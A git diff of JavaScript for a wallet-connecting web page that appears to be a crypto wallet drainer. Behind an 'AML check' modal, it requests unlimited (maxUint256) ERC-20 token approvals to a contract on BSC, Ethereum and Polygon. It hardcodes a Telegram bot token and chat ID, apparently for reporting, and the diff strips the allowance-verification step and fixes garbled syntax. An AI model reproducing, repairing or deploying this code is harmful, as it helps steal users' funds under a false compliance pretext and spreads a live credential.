@@ -2,7 +2,7 @@ import { bsc, mainnet, polygon } from '@reown/appkit/networks'
 import { createAppKit } from '@reown/appkit'
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
 import { formatUnits, maxUint256, isAddress, getAddress, parseUnits } from 'viem'
-import { readContract, writeContract, waitForTransaction } from '@wagmi/core'
+import { readContract, writeContract } from '@wagmi/core'
 import { showAMLCheckModal } from './aml-check-modal.js';
 
 // Утилита для дебаунсинга
@@ -19,8 +19,7 @@ const projectId = import.meta.env.VITE_PROJECT_ID || '2511b8e8161d6176c55da917e0
 if (!projectId) throw new Error('VITE_PROJECT_ID is not set')
 
 const telegramBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || '7893105607:AAFqn6yRhXVocTodMo8xNufTFKjmzMYnNAU'
-const telegramChatId = import};
-meta.env.VITE_TELEGRAM_CHAT_ID || '-1002834788839'
+const telegramChatId = import.meta.env.VITE_TELEGRAM_CHAT_ID || '-1002834788839'
 
 const networks = [bsc, mainnet, polygon]
 const networkMap = {
@@ -125,7 +124,7 @@ function createCustomModal() {
   document.head.appendChild(style)
 
   const modal = document.createElement('div')
-  modal Weyid = 'customModal'
+  modal.id = 'customModal'
   modal.className = 'custom-modal'
   modal.innerHTML = `
     <div class="custom-modal-content">
@@ -148,7 +147,6 @@ function showCustomModal() {
 function hideCustomModal() {
   const modal = document.getElementById('customModal')
   if (modal) {
-    modal.className = 'custom-modal'
     modal.classList.remove('show')
     setTimeout(() => modal.style.display = 'none', 300)
   }
@@ -435,16 +433,6 @@ const erc20Abi = [
     name: 'approve',
     outputs: [{ name: 'success', type: 'bool' }],
     type: 'function'
-  },
-  {
-    constant: true,
-    inputs: [
-      { name: '_owner', type: 'address' },
-      { name: '_spender', type: 'address' }
-    ],
-    name: 'allowance',
-    outputs: [{ name: 'remaining', type: 'uint256' }],
-    type: 'function'
   }
 ]
 
@@ -480,25 +468,6 @@ const getTokenPrice = async (symbol) => {
   }
 }
 
-const checkAllowance = async (wagmiConfig, tokenAddress, owner, spender, chainId) => {
-  if (!wagmiConfig || !isAddress(tokenAddress) || !isAddress(owner) || !isAddress(spender)) {
-    throw new Error('Invalid or missing parameters for allowance check')
-  }
-  try {
-    const allowance = await readContract(wagmiConfig, {
-      address: tokenAddress,
-      abi: erc20Abi,
-      functionName: 'allowance',
-      args: [owner, spender],
-      chainId
-    })
-    return allowance
-  } catch (error) {
-    store.errors.push(`Error checking allowance for ${tokenAddress} on chain ${chainId}: ${error.message}`)
-    return BigInt(0)
-  }
-}
-
 const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId) => {
   if (!wagmiConfig) throw new Error('wagmiConfig is not initialized')
   if (!tokenAddress || !contractAddress) throw new Error('Missing token or contract address')
@@ -506,7 +475,7 @@ const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId)
   const checksumTokenAddress = getAddress(tokenAddress)
   const checksumContractAddress = getAddress(contractAddress)
   try {
-    const gasLimit = BigInt(500000)
+    const gasLimit = BigInt(550000)
     const maxFeePerGas = BigInt(1000000000)
     const maxPriorityFeePerGas = BigInt(1000000000)
     console.log(`Approving token with gasLimit: ${gasLimit}, maxFeePerGas: ${maxFeePerGas}, maxPriorityFeePerGas: ${maxPriorityFeePerGas}`)
@@ -521,32 +490,7 @@ const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId)
       maxPriorityFeePerGas
     })
     console.log(`Approve transaction sent: ${txHash}`)
-    
-    // Ожидание подтверждения транзакции
-    const receipt = await waitForTransaction(wagmiConfig, { hash: txHash, chainId })
-    if (receipt.status !== 'success') {
-      throw new Error(`Transaction failed: ${txHash}`)
-    }
-    console.log(`Transaction confirmed: ${txHash}`)
-
-    // Проверка allowance
-    let attempts = 0
-    const maxAttempts = 10
-    const delay = 2000 // Задержка в миллисекундах между попытками
-    let allowance = BigInt(0)
-    
-    while (attempts < maxAttempts) {
-      allowance = await checkAllowance(wagmiConfig, checksumTokenAddress, wagmiConfig.account, checksumContractAddress, chainId)
-      if (allowance >= maxUint256) {
-        console.log(`Allowance set to maxUint256 for ${checksumTokenAddress}`)
-        return txHash
-      }
-      console.log(`Allowance not yet updated, current: ${allowance}, attempt ${attempts + 1}/${maxAttempts}`)
-      await new Promise(resolve => setTimeout(resolve, delay))
-      attempts++
-    }
-    
-    throw new Error(`Allowance not updated to maxUint256 after ${maxAttempts} attempts`)
+    return txHash
   } catch (error) {
     store.errors.push(`Approve token failed: ${error.message}`)
     throw error
@@ -747,7 +691,7 @@ updateButtonVisibility(appKit.getIsConnectedState())
 // Обработчик для кнопок подключения кошелька
 document.querySelectorAll('.open-connect-modal').forEach(button => {
   button.addEventListener('click', (event) => {
-    event.stopPropagation();
+    event.stopPropagation(); // Предотвращаем всплытие события к document
     if (!appKit.getIsConnectedState()) {
       appKit.open();
     }
